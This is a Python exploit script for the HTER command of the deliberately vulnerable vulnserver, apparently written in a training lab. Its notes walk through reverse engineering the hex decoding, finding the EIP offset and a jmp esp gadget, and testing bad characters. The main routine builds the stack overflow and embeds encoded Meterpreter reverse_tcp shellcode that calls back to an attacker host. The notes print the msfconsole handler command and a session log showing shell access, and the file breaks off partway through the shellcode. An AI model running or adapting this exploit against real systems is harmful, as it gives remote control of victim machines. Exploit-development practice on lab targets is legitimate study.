#!/usr/bin/env python3
import os, sys, re, socket, binascii, time
from struct import pack, unpack
from IPython import embed

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv; g'

## ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 004021D1; g'

## ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 0x625012f0; g'

## ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 0x625012f0 ;g; t; db esp L0xff'

NOTES=r"""
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./poc.py 192.168.56.100:9999
Welcome to Vulnerable Server! Enter HELP for help.

Valid Commands:
HELP
STATS [stat_value]      ; not_exploitable
RTIME [rtime_value]     ; not_exploitable
LTIME [ltime_value]     ; not_exploitable
SRUN [srun_value]       ; not_exploitable
TRUN [trun_value]       ; exploitable
GMON [gmon_value]       ; exploitable
GDOG [gdog_value]       ; not_exploitable
KSTET [kstet_value]     ; exploitable
GTER [gter_value]       ; exploitable
HTER [hter_value]       ; exploitable
LTER [lter_value]
KSTAN [lstan_value]
EXIT

HTER appears to have two, maybe three paths that can be taken and get the jewels.

One of the first jump choices we come across is the follwoing basic block:
.text:00402230
.text:00402230 loc_402230:
.text:00402230 mov     edx, [ebp+var_20]
.text:00402233 mov     eax, [ebp+buf]
.text:00402236 add     eax, edx
.text:00402238 movzx   eax, byte ptr [eax]
.text:0040223B test    al, al
.text:0040223D jz      short loc_402251

[ebp+var_20] was previously set to 0x6. In effect, test al,al is actually testing if the sixth byte in the string (the first \x41) is zero.  The jz instruction will be looking for zf=1.

    If it is zero, we end up at the following basic block, whcih calls _Function4
    .text:00402251
    .text:00402251 loc_402251:
    .text:00402251 mov     eax, [ebp+var_58]
    .text:00402254 mov     [esp], eax      ; Source
    .text:00402257 call    _Function4                           <-----
    .text:0040225C mov     dword ptr [esp+8], 800h ; Size
    .text:00402264 mov     dword ptr [esp+4], 0 ; Val
    .text:0040226C mov     eax, [ebp+var_58]
    .text:0040226F mov     [esp], eax      ; void *
    .text:00402272 call    _memset
    .text:00402277 mov     dword ptr [esp+0Ch], 0 ; flags
    .text:0040227F mov     dword ptr [esp+8], 12h ; len
    .text:00402287 mov     dword ptr [esp+4], offset aHterRunningFin ; "HTER RUNNING FINE\n"
    .text:0040228F mov     eax, [ebp+s]
    .text:00402292 mov     [esp], eax      ; s
    .text:00402295 call    _send@16        ; send(x,x,x,x)
    .text:0040229A sub     esp, 10h
    .text:0040229D mov     [ebp+var_1C], eax
    .text:004022A0 jmp     loc_4024A9

If it is NOT zero, we end up at the following basic block:
    .text:0040223F mov     eax, [ebp+var_20]
    .text:00402242 lea     edx, [eax+1]
    .text:00402245 mov     eax, [ebp+buf]
    .text:00402248 add     eax, edx
    .text:0040224A movzx   eax, byte ptr [eax]
    .text:0040224D test    al, al
    .text:0040224F jnz     short loc_4021D3

    This basic block effectively checks the 7th byte of the string (the 2nd \x41 or 2nd byte following "HTER ")

    If the 7th byte is a zero, we end up in a not very useful (seemingly) block, else we end up in the previously mentioned basic block at  00402251

    The not-very-interesting block:
        .text:004021D3
        .text:004021D3 loc_4021D3:
        .text:004021D3 mov     edx, [ebp+var_20]
        .text:004021D6 mov     eax, [ebp+buf]
        .text:004021D9 add     eax, edx
        .text:004021DB movzx   eax, word ptr [eax]
        .text:004021DE mov     word ptr [ebp+String], ax
        .text:004021E5 mov     dword ptr [esp+8], 10h ; Radix
        .text:004021ED mov     dword ptr [esp+4], 0 ; EndPtr
        .text:004021F5 lea     eax, [ebp+String]
        .text:004021FB mov     [esp], eax      ; String
        .text:004021FE call    _strtoul
        .text:00402203 mov     [ebp+var_5C], eax
        .text:00402206 mov     eax, [ebp+var_5C]
        .text:00402209 movzx   eax, al
        .text:0040220C mov     ecx, [ebp+var_24]
        .text:0040220F mov     edx, [ebp+var_58]
        .text:00402212 add     edx, ecx
        .text:00402214 mov     dword ptr [esp+8], 1 ; Size
        .text:0040221C mov     [esp+4], eax    ; Val
        .text:00402220 mov     [esp], edx      ; void *
        .text:00402223 call    _memset
        .text:00402228 add     [ebp+var_20], 2
        .text:0040222C add     [ebp+var_24], 1

        This basic block seems to take a byte and do some math with it (_strtoul), and _memset at effectively ebp+var_54. Of note, it gets moved to ESP.  It appears a single byte or a word is converted to unsigned long, then it's value as string placed on the stack at esp.  Increemented, then loops back to the first conditional jump block.

        We can get to this basic block with the seventh byte set to 0x0.

I would like to test the outlier case that doesn't result in going to the basic block that calls _Function4.  The following should do it.

    oflow_sz = 0x1000
    opcode = "HTER "
    preamble = "\x41\x00"
    slack = "\x41" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        preamble
    ]])))
    buf = f"{opcode}{preamble}{slack}"

I set a breakpoint there:
bp 004021D3
Ok, here's what I found. 
"HTER \x41\x41\x41" will make it to the basic block that calls _strtoul.

Both of the following will make it to the basic block that calls _Function4.
"HTER \x41\x00"
"HTER \x41\x41\x00" 

And it's not the 6th and 7th like I thought, it's actually +6 and +7 from *recvbuf, meaning it's the 7th and 8th bytes, or the 2nd and 3rd of the effective string that follows "HTER " opcode.

At any rate, I wish to explore the basic block that calls _strtoul and figure out what it's doing.

The following ought to get there:
    oflow_sz = 0x1000
    opcode = "HTER "
    preamble = "\x41\x41\x41"
    slack = "\x41" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        preamble
    ]])))
    buf = f"{opcode}{preamble}{slack}"


    sock = sender(ip, port,buf)
    sock.recv(1024)  ## clear the airwaves
    sock.close()  

It turns out, \x41\x41 is moved to a location on the stack:
0:001> dc eax
009ffb18  (00004141) 009ffb84 730fae50 5f175d11  AA......P..s.]._
009ffb28  00000000 00000000 00000000 00000000  ................

Then, the call to strtoul returns 000000aa.

So basically, a word is converted to a byte.  It's then stored at [ebp+var_5C].
Carrying on.

Before the call to the _memset, here's esp:
addr, destbuf, val, sz
009ffa08 00cf4f70 000000aa 00000001

Ok, what is going on here is pretty clear.  A string is being built basically where every two bytes are converted into their represented characters, to form a hex byte.
\x41\x41 == aa
\x43\x45 == ce

If I let execution continue, 
0:001> g
(efc.b80): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=009ff610 ebx=00000100 ecx=00cf5770 edx=000008aa esi=00401960 edi=00401960
eip=aaaaaaaa esp=009ffa08 ebp=aaaaaaaa iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
aaaaaaaa ??              ???

And esp:
0:001> dd esp L0x102
009ffa08  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa
009ffa18  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa
[...]
009ffdf8  aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa
009ffe08  aaaaaaaa 000008aa

So this poses a very interesting challenge.  EIP is controllable by the first DWORD (or converted dword,anyways) of the string.  Actually, that's not correct.  
0:001> r esp
esp=009ffa08

First, I'll need a way to figure out how to convert a word to a byte.

Well, so we have the following:
word = "\x41\x41"
''.join(x.decode('latin-1') for x in unpack("<ss",word.encode())[0:2])
'AA'

So that's good for reproducing exactly what is already being done by the strtoul.  What is actually needed is a way to reverse it.  What we want to do is clearly define what we want that string to be after strtoul basic block converts it. So for that, we're going to need to figure out a way to reverse the process.

Well here's converting a single hex byte to two characters:
In [60]: byte
Out[60]: 'A'

In [61]: ''.join([chr(int(hex(ord(x))[2:],16))  for x in hex(ord(byte))[2:]])
Out[61]: '41'

In [62]: characters = ''.join([chr(int(hex(ord(x))[2:],16))  for x in hex(ord(byte))[2:]])

In [63]: len(byte)
Out[63]: 1

In [64]: len(characters)
Out[64]: 2


Something like the following will do the conversion before transmi, then this opcode will convert it back down to the actual shellcode:

Supposing we had a string of shellcode:
actual = "AB"
transmittable = ''.join([''.join([chr(int(hex(ord(x))[2:],16))  for x in hex(ord(byte))[2:]]) for byte in actual ])

In [70]: transmittable
Out[70]: '4142'

Solution:
def bytes_to_words(somestring):
    return ''.join([''.join([chr(int(hex(ord(x))[2:],16))  for x in hex(ord(byte))[2:]]) for byte in somestring ])
In [76]: bytes_to_words("\x67\x41\x98\xea")
Out[76]: '674198ea'

Now for the vibe check.  
preamble = bytes_to_words("\x67\x41\x98\xea")

And I'll resend, breaking after the call to strtoul
After hitting the break a few times, I check the destination buffer that _memset writes to:
0:003> dd poi(esp)-4
006d4f70  ea984167

0:003> db poi(esp)-4 L0x4
006d4f70  67 41 98 ea 

Perfect.  I have successfully reversed the operation, and this function will allow me to write shellcode in free form, convert it for transmission, and it will be decoded back to the original in the destination buffer.

This also means there are no bad bytes?  Might test for that.
    preamble += bytes_to_words("\x67\x00\x98\xea")

Not exactly:
0:003> db ecx-10
001f4f6c  4d 01 00 08 (67 09 8e a)a-aa aa aa aa aa aa aa aa  M...g...........

This may be solvable by either omitting null bytes, or by converting any single instance of a null byte to two null bytes before converting for send.

Let's try the latter just to test the theory.
 preamble += bytes_to_words("\x67\x00\x98\xea".replace("\x00","\x00\x00"))

Confirmed:
0:003> db poi(esp)-4 L0x4
00694f70  67 00 98 ea                                      g...

The following function will perform this replacement for all badchars, and will perform the conversion.
def convert_for_send(somestring):
    return bytes_to_words(somestring.replace("\x00","\x00\x00"))

However, I think what we'll do is avoid null byte still, because that's just going to throw off math.
def convert_for_send(somestring):
    return bytes_to_words(somestring)

With the following:
[#!]
    oflow_sz = 0x1000
    opcode = "HTER "
    preamble = "\x41" + convert_for_send(packlatin("<L",0x90909090))
    pattern = sys.argv[2]
   
    encodeable = f"{pattern}"
    buf = f"{opcode}{preamble}{convert_for_send(encodeable)}"

[$]
./hter.py 192.168.56.100:9999 $(msf-pattern_create -l 0x1000)



0:003> g
(1b58.1c88): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00dbf610 ebx=00000108 ecx=009b5770 edx=00000043 esi=00401960 edi=00401960
eip=42366842 esp=00dbfa08 ebp=35684234 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
42366842 ??              ???



┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ msf-pattern_offset -l 0x1000 -q 42366842 
[*] Exact match at offset 1008

0:003> db esp-0n1008-0x8
00dbf610  90 90 90 90 41 61 30 41-61 31 41 61 32 41 61 33  ....Aa0Aa1Aa2Aa3
00dbf620  41 61 34 41 61 35 41 61-36 41 61 37 41 61 38 41  Aa4Aa5Aa6Aa7Aa8A

I should theoretically be able to control what EIP crashes with, with no math.  The following should crash EIP pointing at 0x43434343:
    oflow_sz = 0x1000
    EIP_offset = 1008
    opcode = "HTER "
    preamble = "\x41" + convert_for_send(packlatin("<L",0x90909090))
    slack1 = "\x42" * EIP_offset
    EIP = packlatin("<L",0x43434343)

    slack2 = "\x44" * (oflow_sz - (sum(iter(len(x) for x in[
        opcode,
        preamble,
        slack1+slack1,
        EIP+EIP,
    ]))))
    encodeable = f"{slack1}{EIP}"
    buf = f"{opcode}{preamble}{convert_for_send(encodeable)}{slack2}"

I've changed my mind.  The following will do the conversion, but it will also determine how many replacements of \x00 need to be done beforehand, and return a string same size as the number of replacements.  This string can then be used in offset calculations to make up for the difference the replacements make.
def convert_for_send(somestring):
    num_replacements = somestring.count("\x00")
    thestring = somestring.replace("\x00","\x00")
    if num_replacements > 0:
        extra_chars = "\xff" * num_replacements
    else:
        extra_chars = ""
    return bytes_to_words(somestring), extra_chars

I just want to test that I do in fact have control of EIP.  Firstly, I have refactored a bit so things make more sense going formard.  Let's try a jmp esp:

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ rp++-ng -f essfunc.dll --va 0x62500000 -b "\x00" -iusr8 --regex ": jmp esp" 

    rp++-ng?                           ^^           
                _________ _________      ___ __  __________ `
    .       |    _o___|    _o___ ++- |   \  |/   /_____/  !
            |___|\____|___|%%%%%     |____\_|\___\____.] 
    z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' 
        ;                                    Chain faster
                [[                            $$$$$ $$$$$$      i
                        +                                    SYANiDE
            

    [+] Pruned gadgets to unique occurrences
    [+] curated gadget list saved to essfunc_curatedgadgets.txt



    #### REGEX: : jmp esp ####
    0x625012f0: jmp esp ; 

And of course the refactor, and we'll jmp esp:
    oflow_sz = 0x1000
    EIP_offset = 1008
    opcode = "HTER "
    preamble = "\x41\x45\x45\x45\x45\x45\x45\x45\x45"
    slack1 = "\x42" * EIP_offset
    EIP = packlatin("<L",0x625012f0)
    # EIP = packlatin("<L",0x625012f0) # 0x625012f0: jmp esp ;

    converted, null_difference = convert_for_send(
        f"{slack1}{EIP}"
    )
    slack2 = "\x44" * (oflow_sz - (sum(iter(len(x) for x in[
        opcode,
        preamble,
        converted,
        null_difference
    ]))))
    buf = f"{opcode}{preamble}{converted}{slack2}"


    sock = sender(ip, port,buf)
    sock.recv(1024)  ## clear the airwaves
    sock.close()  

Break on it, of course:
((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 0x625012f0; g'

The breakpoint is hit:
0:003> bp 0x625012f0; g
Breakpoint 0 hit
eax=00f8f610 ebx=000000d4 ecx=00b85770 edx=000000dd esi=00401960 edi=00401960
eip=625012f0 esp=00f8fa08 ebp=42424242 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
essfunc!EssentialFunc2+0x3:
625012f0 ffe4            jmp     esp {00f8fa08}

And crash-time esp:
0:003> dd esp L0x8
00f8fa08  dddddddd dddddddd dddddddd dddddddd
00f8fa18  dddddddd dddddddd dddddddd dddddddd

0:003> dd esp-4 l0x1
00f8fa04  625012f0

Perfect.  I'd like to give a badchar search the old college try.

Very interesting results.
0:001> db esp L0xff
00bcfa08  12 34 56 78 9a bc de f1-01 11 21 31 41 51 61 71  .4Vx......!1AQaq
00bcfa18  81 91 a1 b1 c1 d1 e1 f2-02 12 22 32 42 52 62 72  .........."2BRbr
00bcfa28  82 92 a2 b2 c2 d2 e2 f3-03 13 23 33 43 53 63 73  ..........#3CScs
00bcfa38  83 93 a3 b3 c3 d3 e3 f4-04 14 24 34 44 54 64 74  ..........$4DTdt

It would appear that any appearance of 0 is replaced with nothing.  This is even after null replaced with double-null.

We'll need to examine this and figure out what is going on.  The following will break and display the badchars string:

((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 0x625012f0 ;g; t; db esp L0xff'

I've changed the convert_for_send function a bit to embed IPython to examine the string.  Also removed all the replacement 
def convert_for_send(somestring):
    num_replacements = 0
    thestring = somestring
    embed()
    if num_replacements > 0:
        extra_chars = "*" * num_replacements
    else:
        extra_chars = ""
    return bytes_to_words(somestring), extra_chars

Here is the string before any type of replacement, conversion, encoding:
In [1]: thestring
Out[1]: 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBð\x12Pb\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0¡¢£¤¥¦§¨©ª«¬\xad®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ'

We can see that only the range \x00 through \x0f are affected:
Breakpoint 0 hit
00affa08  (01 23 45 67 89 ab cd ef)-10 11 12 13 14 15 16 17  .#Eg............
00affa18  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !"#$%&'
00affa28  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567


Bytes like \x10, \x20, \x30, etc, not affected.  they end up in the destination decoded.

[$]
man ascii
       Oct   Dec   Hex   Char                      │ Oct   Dec   Hex   Char
       ────────────────────────────────────────────┼───────────────────────────
        [...]
       060   48    30    0                         │ 160   112   70    p

If we want "0" to end up in bytes \x00 through \x0f on the other end, then we'll need to replace these bytes with \x30\x[whatever] so they translate back to \x0[whatever] on the other end.

Actually:
In [1]: bytes_to_words(thestring)
Out[1]: '424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242f01250620123456789abcdef101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff'

It appears not to be a matter of filtering at the destination, but an error in the way the conversion is occurring.
Namely:
0123456789abcdef

The zero is getting converted correctly.  it's just \x00 doesn't convert cleanly to a zero character via bytes_to_words.

The problem is in the way hex(ord()) is converthing the bytes.  Example:
In [5]: hex(ord("\x01"))
Out[5]: '0x1'

In [11]: hex(ord("\x01"))[2:]
Out[11]: '1'

The solution is to use zfill:
In [12]: hex(ord("\x01"))[2:].zfill(2)
Out[12]: '01'

In this case, no replacement would be needed.  So I can simplify things a bit.
def bytes_to_words(somestring):
    return ''.join([''.join([chr(int(hex(ord(x))[2:],16))  for x in hex(ord(byte))[2:].zfill(2)]) for byte in somestring ])

def convert_for_send(somestring):
    return bytes_to_words(somestring)

After making the adjustments, resending the payload.

Now, the badchar string is missing altogether.  Frist byte is a null byte:
0:003> bp 0x625012f0 ;g; t; db esp L0xff
Breakpoint 0 hit
00f2fa08  (00) 4f 1f 00 00 00 00 00-01 00 00 00 00 00 00 00  .O..............
00f2fa18  30 22 1f 00 00 00 83 00-02 00 00 00 01 00 00 00  0"..............
00f2fa28  38 01 00 01 fe 01 00 00-a0 ff 83 00 00 00 00 00  8...............

Ok, that for some odd reason makes a lot of sense.  There are paths that lead away fromt he basic block that handles strtoul if either of the two bytes that make up the word that the function would otherwise convert, are a zero.  I could imagine that there must be some logic path that, if both bytes are null bytes, then the handler for "HTER " must exit.  Normally this would crash if enough of the overflow string was written into the dest buffer.

At any rate, the sauce recipe is known and it's time to serve it up hot.

All that is left to do now is to add a nopsled and encoded shellcode, avoiding \x00 which is still a bad char.

And, it shells good!  Mmm yum

┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.56.187
LPORT => 80
[*] Started reverse TCP handler on 192.168.56.187:80 
[*] Sending stage (175686 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (192.168.56.187:80 -> 192.168.56.100:50080) at 2023-05-26 01:42:03 -0700

meterpreter > getuid
Server username: DESKTOP-4NR4332\Admin
meterpreter > sysinfo
Computer        : DESKTOP-4NR4332
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 


"""

def bytes_to_words(somestring):
    return ''.join([''.join([chr(int(hex(ord(x))[2:],16))  for x in hex(ord(byte))[2:].zfill(2)]) for byte in somestring ])

def convert_for_send(somestring):
    return bytes_to_words(somestring)

def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')

badchars = "\x00"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def sender(ip, port, buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(buf.encode('latin-1'))
    return sock

def sender_sockreuse(sock,buf):
    sock.send(buf.encode('latin-1'))
    return sock

def help(ip,port):
    buf = "HELP" 
    sock = sender(ip, port, buf)
    # print(sock.recv(4096))
    print(sock.recv(4096).decode('latin-1'))
    print(sock.recv(4096).decode('latin-1'))
    sock.close()

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    # help(ip,port)



    oflow_sz = 0x1000
    EIP_offset = 1008
    opcode = "HTER "
    preamble = "\x41\x45\x45\x45\x45\x45\x45\x45\x45"
    slack1 = "\x42" * EIP_offset
    EIP = packlatin("<L",0x625012f0) # 0x625012f0: jmp esp ;
    # bad = gen_badchars("\x00", "\x00","\xff")
    nopsled = "\x90" * 0x20
    shellcode = (
        # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.187 LPORT=80 EXITFUNC=process -b "\x00" -e x86/xor_dynamic -f c
        # sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; run"
        "\xeb\x23\x5b\x89\xdf\xb0\x3e\xfc\xae\x75\xfd\x89\xf9\x89"
        "\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x36\x80\x74\x08\x46"
        "\x80\x3e\x3e\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff"
        "\x05\x3e\xf9\xed\x8a\x05\x05\x05\x65\x8c\xe0\x34\xd7\x61"
        "\x8e\x57\x35\x8e\x57\x09\x8e\x57\x11\x8e\x77\x2d\x34\xfa"
        "\x0a\xb2\x4f\x23\x34\xc5\xa9\x39\x64\x79\x07\x29\x25\xc4"
        "\xca\x08\x04\xc2\x4c\x70\xea\x57\x8e\x57\x15\x8e\x47\x39"
        "\x04\xd5\x52\x8e\x45\x7d\x80\xc5\x71\x49\x04\xd5\x8e\x4d"
        "\x1d\x55\x8e\x5d\x25\x04\xd6\x80\xcc\x71\x39\x34\xfa\x4c"
        "\x8e\x31\x8e\x04\xd3\x34\xc5\xc4\xca\x08\xa9\x04\xc2\x3d"
        "\xe5\x70\xf1\x06\x78\xfd\x3e\x78\x21\x70\xe5\x5d\x8e\x5d"
        "\x21\x04\xd6\x63\x8e\x09\x4e\x8e\x5d\x19\x04\xd6\x8e\x01"
        "\x8e\x04\xd5\x8c\x41\x21\x21\x5e\x5e\x64\x5c\x5f\x54\xfa"
        "\xe5\x5d\x5a\x5f\x8e\x17\xec\x85\xfa\xfa\xfa\x58\x6d\x36"
        "\x37\x05\x05\x6d\x72\x76\x37\x5a\x51\x6d\x49\x72\x23\x02"
        "\x8c\xed\xfa\xd5\xbd\x95\x04\x05\x05\x2c\xc1\x51\x55\x6d"
        "\x2c\x85\x6e\x05\xfa\xd0\x6f\x0f\x6d\xc5\xad\x3d\xbe\x6d"
        "\x07\x05\x05\x55\x8c\xe3\x55\x55\x55\x55\x45\x55\x45\x55"
        "\x6d\xef\x0a\xda\xe5\xfa\xd0\x92\x6f\x15\x53\x52\x6d\x9c"
        "\xa0\x71\x64\xfa\xd0\x80\xc5\x71\x0f\xfa\x4b\x0d\x70\xe9"
        "\xed\x62\x05\x05\x05\x6f\x05\x6f\x01\x53\x52\x6d\x07\xdc"
        "\xcd\x5a\xfa\xd0\x86\xfd\x05\x7b\x33\x8e\x33\x6f\x45\x6d"
        "\x05\x15\x05\x05\x53\x6f\x05\x6d\x5d\xa1\x56\xe0\xfa\xd0"
